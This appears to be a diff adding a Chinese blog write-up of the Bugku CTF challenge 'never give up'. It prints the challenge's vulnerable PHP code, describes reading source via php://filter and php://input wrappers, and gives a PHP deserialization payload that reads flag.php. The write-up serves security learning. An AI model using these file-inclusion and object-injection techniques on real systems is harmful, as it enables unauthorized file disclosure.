@@ -76,13 +76,64 @@ strlen($b)>5  --> 是成立的
 <div align="center">
     <img src="/images/posts/bugku/32.png" >  
 </div>
-&emsp;&emsp;
-&emsp;&emsp;
-&emsp;&emsp;
-&emsp;&emsp;
-&emsp;&emsp;
-&emsp;&emsp;
-&emsp;&emsp;
+
+### never give up
+&emsp;&emsp;查看网页源代码可以发现存在`源码泄露`漏洞。
+<div align="center">
+    <img src="/images/posts/bugku/33.png" >  
+</div>
+&emsp;&emsp;使用`php伪协议：php://input，php://filter`可以读取index.php和hint.php的base64源码。
+<div align="center">
+    <img src="/images/posts/bugku/34.png" >  
+</div>
+&emsp;&emsp;这里直接贴解密后的代码。
+**index.php**
+```php
+<?php  
+$txt = $_GET["txt"];  
+$file = $_GET["file"];  
+$password = $_GET["password"];  
+  
+if(isset($txt)&&(file_get_contents($txt,'r')==="welcome to the bugkuctf")){  
+    echo "hello friend!<br>";  
+    if(preg_match("/flag/",$file)){ 
+        echo "不能现在就给你flag哦";
+        exit();  
+    }else{  
+        include($file);   
+        $password = unserialize($password);  
+        echo $password;  
+    }  
+}else{  
+    echo "you are not the number of bugku ! ";  
+}  
+?> 
+```
+**hint.php**
+```php
+<?php  
+  
+class Flag{//flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this->file)){  
+            echo file_get_contents($this->file); 
+            echo "<br>";
+        return ("good");
+        }  
+    }  
+}  
+?>  
+```
+&emsp;&emsp;从`$password = unserialize($password);`中很明显可以看到是`反序列化漏洞`，所以构造读取flag的payload：`O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`。
+
+&emsp;&emsp;所以最终的payload为：
+<div align="center">
+    <img src="/images/posts/bugku/35.png" width="70%" />  
+</div>
+&emsp;&emsp;这里要注意的是`file=hint.php`，因为要利用php对象反序列化要`先声明对象`，所以要将hint.php包含进来。
+
+&emsp;&emsp;总的来说，这道题的考察点算是比较多的，包括：php伪协议、文件包含、php反序列化，所以质量还是可以的。
 &emsp;&emsp;
 &emsp;&emsp;
 &emsp;&emsp;
